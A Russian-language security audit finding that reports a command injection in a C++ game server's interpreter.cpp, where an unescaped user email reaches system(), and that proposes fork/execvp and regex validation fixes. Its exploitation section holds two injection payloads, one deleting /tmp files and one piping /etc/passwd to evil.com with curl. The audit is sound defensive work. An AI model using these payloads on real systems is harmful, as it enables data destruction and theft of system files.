# Command Injection в interpreter.cpp (send_code.py)

**Файл**: src/engine/ui/interpreter.cpp
**Строки**: ~2 вызова system()
**Критичность**: CRITICAL

## Проблема
Email пользователя передаётся напрямую в `system()` через `send_code.py`:

```cpp
new_loc_codes[GET_EMAIL(d->character)] = random_number;
std::string cmd_line =
    fmt::format("python3 send_code.py {} {} &", GET_EMAIL(d->character), random_number);
auto result = system(cmd_line.c_str());
UNUSED_ARG(result);
```

И второй аналогичный вызов:
```cpp
utils::ConvertToLow(GET_EMAIL(d->character));
std::string cmd_line =
    fmt::format("python3 send_code.py {} {} &", GET_EMAIL(d->character), random_number);
auto result = system(cmd_line.c_str());
UNUSED_ARG(result);
```

Хотя используется `fmt::format` (не конкатенация), email всё равно не экранируется для shell.

## Эксплуатация
Зарегистрировать аккаунт с email:
```
user@test.com; rm -rf /tmp/*
```

При отправке кода выполнится:
```bash
python3 send_code.py user@test.com; rm -rf /tmp/* 12345 &
```

Или для exfiltration данных:
```
user@test.com $(curl http://evil.com/?data=$(cat /etc/passwd | base64))
```

## Решение

**Использовать fork/execve:**
```cpp
void send_code_secure(const std::string& email, int code) {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        std::string code_str = std::to_string(code);
        char* args[] = {
            (char*)"python3",
            (char*)"send_code.py",
            (char*)email.c_str(),
            (char*)code_str.c_str(),
            nullptr
        };
        execvp("python3", args);
        _exit(1);
    }
    // Parent continues
}
```

**Или валидировать email:**
```cpp
bool is_valid_email(const std::string& email) {
    // Проверка на допустимые символы (только буквы, цифры, @, ., -, _)
    static const std::regex email_pattern(R"(^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$)");
    return std::regex_match(email, email_pattern);
}

// В коде:
if (!is_valid_email(GET_EMAIL(d->character))) {
    log("SYSERR: Invalid email format: %s", GET_EMAIL(d->character));
    return;
}
```

**РЕКОМЕНДАЦИЯ**: Использовать fork/execve (первый вариант) для полного устранения проблемы.

**Связано с**: 007_command_injection_critical.md (password.cpp)
